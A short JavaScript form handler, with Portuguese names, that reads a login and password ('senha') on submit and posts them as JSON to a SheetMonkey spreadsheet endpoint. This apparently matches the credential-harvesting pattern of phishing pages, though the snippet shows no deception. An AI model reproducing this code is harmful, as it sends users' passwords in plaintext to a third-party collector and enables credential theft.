const enviar = document.querySelector("#submit")

enviar.addEventListener('click', (evento)=>{
    evento.preventDefault()

    const login = document.querySelector('#login').value
    const senha = document.querySelector('#senha').value

    fetch('https://api.sheetmonkey.io/form/reK414kYUvLeZqJotqZ9ck', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({login , senha})
    })
})